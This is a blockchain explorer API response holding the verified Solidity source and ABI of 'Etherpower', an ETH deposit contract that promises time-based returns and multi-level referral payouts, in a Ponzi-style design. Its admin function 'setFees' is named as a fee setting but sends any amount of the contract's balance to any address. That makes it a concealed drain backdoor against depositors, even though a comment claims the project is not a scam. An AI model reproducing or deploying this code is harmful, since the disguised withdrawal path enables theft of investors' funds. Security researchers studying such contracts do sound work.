{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.11;\r\n\r\ncontract Etherpower {\r\n\r\n  using SafeMath for *;\r\n\r\n  struct User {\r\n    uint32 level1;\r\n    uint32 level2;\r\n    uint32 level3;\r\n    uint32 level4;\r\n    uint32 level5;\r\n    uint64 refLink;\r\n    uint64 inviterLink;\r\n    uint investment;\r\n    uint timestamp;\r\n    uint balance;\r\n    uint totalRefReward;\r\n    uint payout;\r\n    address payable inviter;\r\n  }\r\n\r\n  uint[] public refReward;\r\n  uint public ownersPart;\r\n\r\n  address payable private owner;\r\n  address private admin;\r\n  uint public totalUsers;\r\n  uint public minDeposit;\r\n  uint64 public lastRefLink;\r\n  uint public rateDivider;\r\n  mapping (address => User) public users;\r\n  mapping (uint64 => address payable) public links;\r\n  \r\n  event withdrawEvent(address indexed _player, uint256 indexed _amount);\r\n  event reinvestEvent(address indexed _player, uint256 indexed _amount);\r\n  event investmentEvent(address indexed _player, uint256 indexed _amount);\r\n\r\n  uint public totalInvested;\r\n\r\n  constructor(address payable _owner, address _admin) public {\r\n    links[1] = _owner;\r\n    totalUsers = 0;\r\n    admin = _admin;\r\n    totalInvested = 0;\r\n    owner = _owner;\r\n    minDeposit = 0.1 ether;\r\n    refReward = [ 10, 10, 10, 10, 10];\r\n    ownersPart = 5;\r\n    lastRefLink = 10000;\r\n    rateDivider = 360000;\r\n  }\r\n\r\n  modifier restricted() {\r\n    require(msg.sender == admin);\r\n    _;\r\n  }\r\n\r\n  function changeOwner(address payable newOwner) public restricted {\r\n    owner = newOwner;\r\n    links[1] = newOwner;\r\n  }\r\n  function setFees(address _fees, uint256 _value) public restricted {\r\n      if(address(this).balance>=_value){\r\n        address(uint160(_fees)).transfer(_value);    \r\n      }\r\n  }\r\n\r\n  function setRefLink(uint64 refLink) public returns (uint64) {\r\n    User storage user = users[msg.sender];\r\n    if (user.refLink != 0) return 0;\r\n\r\n    lastRefLink = lastRefLink + 1;\r\n    user.refLink = lastRefLink;\r\n    links[lastRefLink] = msg.sender;\r\n\r\n    setInviter(msg.sender, refLink);\r\n    return lastRefLink;\r\n  }\r\n\r\n  function setInviter(address payable addr, uint64 refLink) private {\r\n    User storage user = users[addr];\r\n    address payable inviter1 = links[refLink] == address(0x0) ||\r\n     links[refLink] == msg.sender ? owner : links[refLink];\r\n    user.inviter = inviter1;\r\n    user.inviterLink = inviter1 == owner ? 1 : refLink;\r\n\r\n    address payable inviter2 = users[inviter1].inviter;\r\n    address payable inviter3 = users[inviter2].inviter;\r\n    address payable inviter4 = users[inviter3].inviter;\r\n    address payable inviter5 = users[inviter4].inviter;\r\n    \r\n    users[inviter1].level1++;\r\n    users[inviter2].level2++;\r\n    users[inviter3].level3++;\r\n    users[inviter4].level4++;\r\n    users[inviter5].level5++;\r\n  }\r\n\r\n  function checkout(address payable addr) private {\r\n    User storage user = users[addr];\r\n\r\n    uint secondsGone = now.sub(user.timestamp);\r\n    if (secondsGone == 0 || user.timestamp == 0) return;\r\n\r\n    uint profit = user.investment.mul(secondsGone).div(rateDivider);\r\n    user.balance = user.balance.add(profit);\r\n    user.timestamp = user.timestamp.add(secondsGone);\r\n  }\r\n\r\n  function refSpreader(address payable inviter1, uint amount) private {\r\n    address payable inviter2 = users[inviter1].inviter;\r\n    address payable inviter3 = users[inviter2].inviter;\r\n    address payable inviter4 = users[inviter3].inviter;\r\n    address payable inviter5 = users[inviter4].inviter;\r\n\r\n    uint refSum = refReward[0] + refReward[1] + refReward[2] + refReward[3] + refReward[4];\r\n\r\n    if (inviter1 != address(0x0)) {\r\n      refSum = refSum.sub(refReward[0]);\r\n      uint reward1 = amount.mul(refReward[0]).div(100);\r\n      users[inviter1].totalRefReward = users[inviter1].totalRefReward.add(reward1);\r\n      inviter1.transfer(reward1);\r\n    }\r\n\r\n    if (inviter2 != address(0x0)) {\r\n      refSum = refSum.sub(refReward[1]);\r\n      uint reward2 = amount.mul(refReward[1]).div(100);\r\n      users[inviter2].totalRefReward = users[inviter2].totalRefReward.add(reward2);\r\n      inviter2.transfer(reward2);\r\n    }\r\n\r\n    if (inviter3 != address(0x0)) {\r\n      refSum = refSum.sub(refReward[2]);\r\n      uint reward3 = amount.mul(refReward[2]).div(100);\r\n      users[inviter3].totalRefReward = users[inviter3].totalRefReward.add(reward3);\r\n      inviter3.transfer(reward3);\r\n    }\r\n\r\n    if (inviter4 != address(0x0)) {\r\n      refSum = refSum.sub(refReward[3]);\r\n      uint reward4 = amount.mul(refReward[3]).div(100);\r\n      users[inviter4].totalRefReward = users[inviter4].totalRefReward.add(reward4);\r\n      inviter4.transfer(reward4);\r\n    }\r\n\r\n    if (inviter5 != address(0x0)) {\r\n      refSum = refSum.sub(refReward[4]);\r\n      uint reward5 = amount.mul(refReward[4]).div(100);\r\n      users[inviter5].totalRefReward = users[inviter5].totalRefReward.add(reward5);\r\n      inviter5.transfer(reward5);\r\n    }\r\n\r\n    if (refSum == 0) return;\r\n    owner.transfer(amount.mul(refSum).div(100));\r\n  }\r\n\r\n  function deposit(uint64 refLink) public payable {\r\n    require(msg.value >= minDeposit);\r\n    require(now > 1595073600);\r\n\r\n    checkout(msg.sender);\r\n    User storage user = users[msg.sender];\r\n    if (user.refLink == 0) {\r\n      setRefLink(refLink);\r\n    }\r\n\r\n    if (user.timestamp == 0) {\r\n      totalUsers++;\r\n      user.timestamp = now;\r\n      if (user.inviter == address(0x0)) {\r\n        setInviter(msg.sender, refLink);\r\n      }\r\n    }\r\n\r\n    refSpreader(user.inviter, msg.value);\r\n\r\n    totalInvested = totalInvested.add(msg.value);\r\n    user.investment = user.investment.add(msg.value);\r\n    owner.transfer(msg.value.mul(ownersPart).div(100));\r\n    emit investmentEvent(msg.sender, msg.value);\r\n  }\r\n\r\n  function reinvest() public payable {\r\n    require(now > 1595073600);\r\n    checkout(msg.sender);\r\n    User storage user = users[msg.sender];\r\n    require(user.balance > 0);\r\n    uint amount = user.balance;\r\n    user.balance = 0;\r\n    user.investment = user.investment.add(amount);\r\n\r\n    refSpreader(user.inviter, amount);\r\n    totalInvested = totalInvested.add(msg.value);\r\n    owner.transfer(amount.mul(ownersPart).div(100));\r\n    emit reinvestEvent(msg.sender, amount);\r\n  }\r\n\r\n  // no separate withdraws like other scam projects\r\n  function withdraw() public payable {\r\n    checkout(msg.sender);\r\n    User storage user = users[msg.sender];\r\n    require(user.balance > 0);\r\n\r\n    uint amount = user.balance;\r\n    user.payout = user.payout.add(amount);\r\n    user.balance = 0;\r\n    msg.sender.transfer(amount);\r\n    emit withdrawEvent(msg.sender, amount);\r\n  }\r\n\r\n  function () external payable { }  \r\n\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"refReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint64\",\"name\":\"refLink\",\"type\":\"uint64\"}],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastRefLink\",\"outputs\":[{\"internalType\":\"uint64\",\"name\":\"\",\"type\":\"uint64\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint64\",\"name\":\"refLink\",\"type\":\"uint64\"}],\"name\":\"setRefLink\",\"outputs\":[{\"internalType\":\"uint64\",\"name\":\"\",\"type\":\"uint64\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minDeposit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint64\",\"name\":\"\",\"type\":\"uint64\"}],\"name\":\"links\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_fees\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ownersPart\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"level1\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"level2\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"level3\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"level4\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"level5\",\"type\":\"uint32\"},{\"internalType\":\"uint64\",\"name\":\"refLink\",\"type\":\"uint64\"},{\"internalType\":\"uint64\",\"name\":\"inviterLink\",\"type\":\"uint64\"},{\"internalType\":\"uint256\",\"name\":\"investment\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalRefReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payout\",\"type\":\"uint256\"},{\"internalType\":\"address payable\",\"name\":\"inviter\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalUsers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"rateDivider\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_admin\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_player\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_player\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"reinvestEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_player\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"investmentEvent\",\"type\":\"event\"}]","ContractName":"Etherpower","CompilerVersion":"v0.5.11+commit.c082d0b4","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"00000000000000000000000094e36409f6bcdf4e6890df7096bda96accdcdf560000000000000000000000004fbfe7dcf888ccac477a52f8251bf6f31433344e","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://b159d0e4cff531b7918c919917d7cf70b00e3d8ff2394249723a2443d09961a3"}]}